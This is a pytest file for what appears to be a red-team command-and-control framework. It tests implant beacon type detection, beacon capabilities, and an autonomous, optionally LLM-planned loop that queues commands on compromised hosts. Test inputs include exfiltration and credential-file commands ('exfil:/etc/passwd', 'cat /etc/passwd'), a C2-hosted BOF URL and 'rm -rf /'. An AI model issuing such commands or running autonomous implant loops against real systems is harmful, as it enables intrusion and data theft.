"""Tests for the implant beacon menu and the autonomous beacon loop.

Covers the single-home beacon kind contract (``modules.beacon_kinds``),
the autonomous loop engine (``modules.beacon_loop``) and the new
``beacon_loop`` loop kind in the dashboard loop manager.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from modules.beacon_kinds import (
    BEACON_COMMAND_CATALOG,
    beacon_capabilities,
    beacon_commands,
    beacon_menu_bofs,
    beacon_menu_playbooks,
    detect_beacon_type,
)
from modules.beacon_loop import (
    BeaconLoopConfig,
    _validate_candidate,
    heuristic_plan,
    queue_beacon_command,
    run_beacon_loop,
    summarize_history,
    write_report,
)
from modules.loop_manager import (
    KIND_BEACON_LOOP,
    LoopSpec,
    LoopValidationError,
    _loop_command,
    validate_beacon_target,
)

BSB_CLIENTS = {"linux_beacon"}


class TestDetectBeaconType:
    def test_bsb_client_id_wins(self, tmp_path: Path):
        kind, label = detect_beacon_type("linux_beacon", "linux", BSB_CLIENTS, tmp_path)
        assert kind == "bsb"
        assert "BlackSandBeacon" in label

    def test_go_agent_by_staged_binary(self, tmp_path: Path):
        (tmp_path / "victim-1.exe").write_bytes(b"MZ")
        kind, _ = detect_beacon_type("victim-1", "windows", set(), tmp_path)
        assert kind == "go"

    def test_go_agent_by_loader_source(self, tmp_path: Path):
        (tmp_path / "l_victim-2.go").write_text("package main")
        kind, _ = detect_beacon_type("victim-2", "windows", set(), tmp_path)
        assert kind == "go"

    def test_windows_c_beacon_fallback(self, tmp_path: Path):
        kind, _ = detect_beacon_type("stub1", "windows", set(), tmp_path)
        assert kind == "c_win"

    def test_linux_fallback_and_unknown(self, tmp_path: Path):
        assert detect_beacon_type("p1", "linux", set(), tmp_path)[0] == "linux"
        assert detect_beacon_type("p2", "darwin", set(), tmp_path)[0] == "unknown"
        assert detect_beacon_type("p3", "", set(), tmp_path)[0] == "unknown"


class TestBeaconCapabilities:
    def test_bsb_has_linux_bofs(self):
        caps = beacon_capabilities("bsb")
        assert caps["bof"] is True
        assert caps["bof_platform"] == "linux"
        assert caps["shellcode"] is False

    def test_c_win_has_windows_bofs(self):
        caps = beacon_capabilities("c_win")
        assert caps["bof"] is True
        assert caps["bof_platform"] == "windows"
        assert caps["shellcode"] is False
        assert caps["dll"] is False

    def test_go_agent_has_shellcode_dll(self):
        caps = beacon_capabilities("go")
        assert caps["bof"] is False
        assert caps["shellcode"] is True
        assert caps["dll"] is True

    def test_unknown_minimal(self):
        caps = beacon_capabilities("unknown")
        assert caps["bof"] is False
        assert caps["atomic"] is True
        assert caps["loop"] is True

    def test_command_catalog_per_type(self):
        assert len(beacon_commands("go")) > 5
        assert beacon_commands("unknown") == [{"cmd": "shell", "label": "Shell command", "args": ""}]
        assert set(BEACON_COMMAND_CATALOG) >= {"go", "bsb", "c_win", "linux", "unknown"}


class TestBeaconMenuData:
    def test_bofs_filtered_by_platform(self, tmp_path: Path):
        caps = {"bof": True, "bof_platform": "linux"}
        rows = beacon_menu_bofs(caps, tmp_path)
        assert rows, "linux BOFs expected from the curated catalog"
        assert all(row["platform"] == "linux" for row in rows)

    def test_bofs_empty_without_capability(self, tmp_path: Path):
        assert beacon_menu_bofs({"bof": False}, tmp_path) == []

    def test_playbooks_from_repo(self):
        repo_root = Path(__file__).resolve().parents[1]
        rows = beacon_menu_playbooks(repo_root)
        assert rows, "apt playbooks expected"
        assert all("apt_name" in row for row in rows)


class TestValidateCandidate:
    def test_capability_commands_allowed(self):
        assert _validate_candidate("discover:") == "discover:"
        assert _validate_candidate("exfil:/etc/passwd") == "exfil:/etc/passwd"
        assert _validate_candidate("bof:https://c2/bof/whoami") == "bof:https://c2/bof/whoami"

    def test_readonly_shell_allowed(self):
        assert _validate_candidate("cat /etc/passwd") == "cat /etc/passwd"
        assert _validate_candidate("uname -a") == "uname -a"

    def test_forbidden_and_metachars_rejected(self):
        assert _validate_candidate("rm -rf /") is None
        assert _validate_candidate("terminate:") is None
        assert _validate_candidate("echo $PATH") is None
        assert _validate_candidate("a; b") is None
        assert _validate_candidate("cat a | grep b") is None
        assert _validate_candidate("") is None
        assert _validate_candidate("x" * 500) is None


class TestQueueCommand:
    def test_appends_to_queue_file(self, tmp_path: Path):
        assert queue_beacon_command("b1", "id", sessions_dir=tmp_path) is True
        assert queue_beacon_command("b1", "whoami", sessions_dir=tmp_path) is True
        queued = json.loads((tmp_path / "cmd_b1.json").read_text())
        assert queued == ["id", "whoami"]

    def test_rejects_bad_ids(self, tmp_path: Path):
        assert queue_beacon_command("", "id", sessions_dir=tmp_path) is False
        assert queue_beacon_command("b1", "", sessions_dir=tmp_path) is False


class TestHeuristicPlan:
    def test_recon_plan_is_validated(self):
        plan = heuristic_plan("situational awareness", "linux", [])
        assert plan
        for command in plan:
            assert _validate_candidate(command) == command

    def test_exfil_goal_targets_exfil(self):
        plan = heuristic_plan("exfiltrate the loot", "linux", [])
        assert any(c.startswith("exfil:") for c in plan)

    def test_seen_commands_not_repeated(self):
        records = [{"command": "discover:"}, {"command": "id"}]
        plan = heuristic_plan("recon", "linux", records)
        assert "discover:" not in plan


class TestSummarizeHistory:
    def test_bounded_and_ordered(self):
        records = [
            {"command": f"cmd{i}", "output": f"out{i}"} for i in range(20)
        ]
        text = summarize_history(records, max_chars=200)
        assert len(text) <= 200
        assert "cmd19" in text


class TestRunBeaconLoop:
    def _write_history(self, sessions: Path, client: str, outputs: list[str]) -> None:
        path = sessions / f"{client}.records.jsonl"
        rows = [
            {
                "client_id": client,
                "client": "linux",
                "command": f"probe{i}",
                "output": out,
            }
            for i, out in enumerate(outputs)
        ]
        path.write_text("\n".join(json.dumps(r) for r in rows), encoding="utf-8")

    def test_heuristic_loop_queues_commands(self, tmp_path: Path):
        sessions = tmp_path / "sessions"
        sessions.mkdir()
        self._write_history(sessions, "b1", ["linux box"])
        logs: list[str] = []
        config = BeaconLoopConfig(
            client_id="b1",
            goal="situational awareness",
            rounds=2,
            round_interval_s=0.0,
            llm_enabled=False,
        )
        report = run_beacon_loop(
            config,
            log=logs.append,
            sleep=lambda s: None,
            sessions_dir=sessions,
        )
        assert report.commands_queued
        assert report.rounds_run == 2
        assert report.verdict == "success"
        queued = json.loads((sessions / "cmd_b1.json").read_text())
        assert queued == report.commands_queued

    def test_invalid_client_aborts(self, tmp_path: Path):
        report = run_beacon_loop(
            BeaconLoopConfig(client_id="!!", goal="g", rounds=1),
            log=lambda s: None,
            sleep=lambda s: None,
            sessions_dir=tmp_path,
        )
        assert report.verdict == "aborted"
        assert not report.commands_queued

    def test_report_written(self, tmp_path: Path):
        sessions = tmp_path / "sessions"
        sessions.mkdir()
        self._write_history(sessions, "b1", ["out"])
        report = run_beacon_loop(
            BeaconLoopConfig(client_id="b1", goal="recon", rounds=1, llm_enabled=False),
            log=lambda s: None,
            sleep=lambda s: None,
            sessions_dir=sessions,
        )
        path = write_report(report, sessions_dir=sessions)
        assert path and path.is_file()
        data = json.loads(path.read_text())
        assert data["client_id"] == "b1"
        assert data["verdict"] in ("success", "aborted", "timeout")


class TestBeaconLoopKind:
    def test_loop_command_shape(self):
        spec = LoopSpec(kind=KIND_BEACON_LOOP, target="linux_beacon", goal="exfil loot")
        command = _loop_command(spec)
        assert command.startswith("beacon_loop --client linux_beacon")
        assert "--goal 'exfil loot'" in command
        import shlex

        assert shlex.split(command)[-2:] == ["--goal", "exfil loot"]

    def test_validate_beacon_target(self):
        assert validate_beacon_target("linux_beacon-01") == "linux_beacon-01"
        with pytest.raises(LoopValidationError):
            validate_beacon_target("bad id!")
        with pytest.raises(LoopValidationError):
            validate_beacon_target("")
        with pytest.raises(LoopValidationError):
            validate_beacon_target(None)

    def test_manager_rejects_bad_beacon_target(self, tmp_path: Path):
        from modules.loop_manager import LoopManager

        manager = LoopManager(loops_dir=tmp_path / "loops")
        with pytest.raises(LoopValidationError):
            manager.start(
                LoopSpec(kind=KIND_BEACON_LOOP, target="bad id!", goal="g"),
                operator="pytest",
            )
